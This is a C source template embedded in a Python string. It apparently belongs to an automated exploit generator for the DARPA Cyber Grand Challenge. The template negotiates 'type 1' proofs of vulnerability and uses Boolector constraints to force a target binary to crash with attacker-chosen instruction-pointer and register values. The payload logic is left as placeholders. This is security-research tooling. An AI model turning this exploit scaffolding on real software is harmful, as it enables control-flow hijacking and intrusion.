c_template = """
#include <libcgc.h>
#include <boolector.h>
#include <stdlib.h>
#include <string.h>

// #define DEBUG 1

enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};

#define UNUSED(x) (void)(x)

typedef unsigned char uint8_t;
typedef short int16_t;
typedef unsigned short uint16_t;
typedef int int32_t;
typedef unsigned int uint32_t;
typedef long long int64_t;
typedef unsigned long long uint64_t;


unsigned int rand_range(unsigned int min, unsigned int max) {
  unsigned int lrand;
  random(&lrand, 4, NULL);
  if (max-min+1 == 0) {
    return lrand;
  }
  return (lrand % (max-min+1)) + min;
}

int fd_ready(int fd) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

size_t blank_receive( int fd, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  char junk_byte;

  while (len < n_bytes) {
    if (!fd_ready(fd)) {
        return len;
    }
    if (receive(fd, &junk_byte, 1, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

void die(char *str) {
  send_all(2, str, strlen(str));
  _terminate(1);
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Negotiate a type 2 pov.
 * Returns 0 on success. On success, the t2vals structure holds the address
 * (t2vals->region_addr) and size of a memory region (t2vals->region_size)
 * from which the POV must leak a specific number of bytes (t2vals->read_size).
 */
int type2_negotiate(type2_vals *t2vals) {
   uint32_t povType = 2;
   if (send_all(3, &povType, sizeof(povType))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t2vals, sizeof(type2_vals)) != sizeof(type2_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Submit the len bytes in the val buffer as the results of a type 2 POV
 * Returns 0 on success
 */
int type2_submit(const unsigned char *val, size_t len) {
   return send_all(3, val, len);
}

size_t receive_until_suffix(char *dst, int *suffix_num, const char **suffixes, const int *suffix_lens, const int n_suffixes) {
  #ifdef DEBUG
  send_all(2, "ENTERING SUFFIX LOOP\\n", strlen("ENTERING SUFFIX LOOP\\n"));
  #endif
  size_t len = 0;
  size_t rx = 0;
  int found = 0;
  *suffix_num = -1;
  while(!found) {
    if (!fd_ready(0)) {
      return len;
    }
    if (receive(0, dst + len, 1, &rx) != 0) {
      len = 0;
      break;
    }
    #ifdef DEBUG
    send_all(2, dst+len, 1);
    #endif
    len += rx;

    for (int i = 0; i < n_suffixes; ++i) {
      const char *suff = suffixes[i];
      unsigned int suffix_len = (unsigned int) suffix_lens[i];
      if (len >= suffix_len && memcmp(suff, dst + (len-suffix_len), suffix_len) == 0) {
        #ifdef DEBUG
        send_all(2, "MATCHED SUFFIX: ", strlen("MATCHED SUFFIX: "));
        send_all(2, suff, suffix_len);
        send_all(2, "\\n", 1);
        #endif
        found = 1;
        *suffix_num = i;
        break;
      }
    }
  }

  return len;
}

// GLOBALS ARE GREAT!
const char *suffixes[] = {suffixes};
const int suffix_lens[] = {suffix_lens};
const int n_suffixes = {n_suffixes};

unsigned int ipmask = {ipmask};
unsigned int regmask = {regmask};
enum register_t regnum = {register};

size_t payload_off = 0;

int status = 0;
char *error;

BoolectorNode *payload_val;
BoolectorNode *payload_val_var;
BoolectorNode *payload_con;
BoolectorNode *cur_byte;

type1_vals t1vals;

void constrain_value_var(Btor *btor, int value_var_idx) {
  BoolectorNode *value_val_var = boolector_match_node_by_id(btor, value_var_idx);
  BoolectorNode *value_val = boolector_int(btor, t1vals.regval, 32);
  BoolectorNode *reg_mask = boolector_unsigned_int(btor, {regmask}, 32);
  BoolectorNode *value_val_var_fixed = boolector_and(btor, value_val_var, reg_mask);
  BoolectorNode *value_val_fixed = boolector_and(btor, value_val, reg_mask);
  BoolectorNode *con = boolector_eq(btor, value_val_fixed, value_val_var_fixed);
  boolector_assert(btor, con);
}

void constrain_ip_var(Btor *btor, int ip_var_idx) {
  BoolectorNode *ip_val_var = boolector_match_node_by_id(btor, ip_var_idx);
  BoolectorNode *ip_val = boolector_int(btor, t1vals.ipval, 32);
  BoolectorNode *ip_mask = boolector_unsigned_int(btor, {ipmask}, 32);
  BoolectorNode *ip_val_var_fixed = boolector_and(btor, ip_val_var, ip_mask);
  BoolectorNode *ip_val_fixed = boolector_and(btor, ip_val, ip_mask);
  BoolectorNode *con = boolector_eq(btor, ip_val_fixed, ip_val_var_fixed);
  boolector_assert(btor, con);
}


char to_char(char *str) {
  int i;
  char r = '\\0';

  if (strlen(str) != 8)
    die("bv_assignment returned a string not of length 8\\n");

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<8;i++)
    r |= ((str[7-i] - '0') & 1) << i;

  return r;
}

size_t real_payload_off(size_t a) {
  return a;
}

void handle_default(char *buf, size_t buf_len) {
  UNUSED(buf);
  UNUSED(buf_len);
  #ifdef DEBUG
  send_all(2, "DEFAULT\\n", 8);
  #endif
  send_all(1, "y\\n", 2);
}


/******** CHALLENGE RESPONSE GLOBALS START ********/
// these are globals to store challenge response variables in
// TODO couldn't we think of the goal ip and goal regval as part of this?
{challenge_response_globals}
/******** CHALLENGE RESPONSE GLOBALS END ********/

/******** INITIAL INPUT CODE START ********/
// these initial sends will make sure to include register values if needed
void initial_codes() {
{initial_input_code}
}
/******** INITIAL INPUT CODE END ********/

/******** SUFFIX RESPONSES CODE START ********/
// these are functions to respond to each suffix
// they will make sure to handle challenge response and include register values if needed
{suffix_responses_code_funcs}
/******** SUFFIX RESPONSES CODE END ********/

/******** MESSAGE RECEIVER AND DISPATCHER START ********/
// This code receives messages and chooses which message to send next
// they will make sure to handle challenge response and include register values if needed
void receive_and_dispatch() {
  char buf[0x8000];
  while(1) {
    int suffix_num;
    size_t buf_len = receive_until_suffix(buf, &suffix_num, suffixes, suffix_lens, n_suffixes);
    switch (suffix_num) {

{message_receiver_and_dispatcher}

    }
  }
}
/******** MESSAGE RECEIVER AND DISPATCHER END ********/


int main() {
  if (type1_negotiate(ipmask, regmask, regnum, &t1vals) != 0) {
    _terminate(0);
  }

  // main code
  initial_codes();

  receive_and_dispatch();

  // make sure we wait until it crashes
  blank_receive(0, 0x2000);

  return 0;
}

"""
